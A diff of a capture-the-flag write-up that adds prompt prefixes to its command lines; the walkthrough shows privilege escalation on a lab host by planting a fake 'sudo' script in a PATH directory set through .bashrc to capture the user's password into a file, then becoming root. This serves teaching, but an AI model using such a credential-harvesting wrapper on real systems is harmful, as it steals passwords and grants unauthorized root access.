@@ -6,11 +6,11 @@ So, we are given a ssh key of frank, let's download and move forward.
 Don't forget to change the permissions too.
 
 ```bash
-chmod 600 id_rsa
+kali@kali:chmod 600 id_rsa
 ```
 
 ```bash
-ssh -i id_rsa frank@10.49.136.220
+kali@kali:ssh -i id_rsa frank@10.49.136.220
 
 The authenticity of host '10.49.136.220 (10.49.136.220)' can't be established.
 ED25519 key fingerprint is: SHA256:WaKDmh6WMRiZ/ysLM5UQM/UirbKKHGy+jRJ5euxQS84
@@ -54,7 +54,7 @@ So, I tried using Linpeas, but I couldnot find anything suspicious.
 Although, sudo version is vulnerable, to exploit this I need make binary but, it is not available, so again back to loophole.
 
 ```bash
-sudo --version
+frank@workstation:sudo --version
 
 Sudo version 1.8.31
 Sudoers policy plugin version 1.8.31
@@ -65,7 +65,7 @@ Sudoers I/O plugin version 1.8.31
 Since, the room tells s to listen explicitly, let's use pspy64 tool.
 
 ```bash
-./pspy64
+frank@workstation:./pspy64
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 .
 .
@@ -95,7 +95,7 @@ First, let's make a tmp directory.
 
 
 ```bash
-mkdir /tmp/eavesdrop
+frank@workstation:mkdir /tmp/eavesdrop
 ```
 
 Make a malicious sudo script using:
@@ -113,19 +113,19 @@ echo "$password" | /usr/bin/sudo -S "$@"
 Make it executable.
 
 ```bash
-chmod +x sudo
+frank@workstation:chmod +x sudo
 ```
 
 Add our created directory to path.
 
 ```bash
-export PATH="/tmp/eavesdrop:$PATH"
+frank@workstation:export PATH="/tmp/eavesdrop:$PATH"
 ```
 
 Verify:
 
 ```bash
-echo $PATH
+frank@workstation:echo $PATH
 /tmp/eavesdrop:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 ```
 
@@ -137,7 +137,7 @@ Unlucky for us, the path resets when the sudo runs.
 So, let's try by editing our .bashrc file. Add a path in the .bashrc file.
 
 ```bash
-cat .bashrc | head
+frank@workstation:cat .bashrc | head
 
 # ~/.bashrc: executed by bash(1) for non-login shells.
 # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
@@ -153,7 +153,7 @@ esac
 Let's make a new sudo file, slightly changing it.
 
 ```bash
-cat sudo
+frank@workstation:cat sudo
 
 #!/bin/bash
 read -sp password
@@ -164,14 +164,14 @@ Make it executable, and wait for some time.
 We got a password.txt dropped.
 
 ```bash
-cat password.txt
+frank@workstation:cat password.txt
 !@#.....22%*
 ```
 
 Let's become root.
 
 ```bash
-sudo su
+frank@workstation:sudo su
 [sudo] password for frank: 
 root@workstation:/home/frank# 
 ```
@@ -180,7 +180,7 @@ Boom, and we are root.
 Let's head to /root and read the flag.
 
 ```bash
-cat flag.txt
+root@workstation:cat flag.txt
 flag{14.....00}
 ```
 
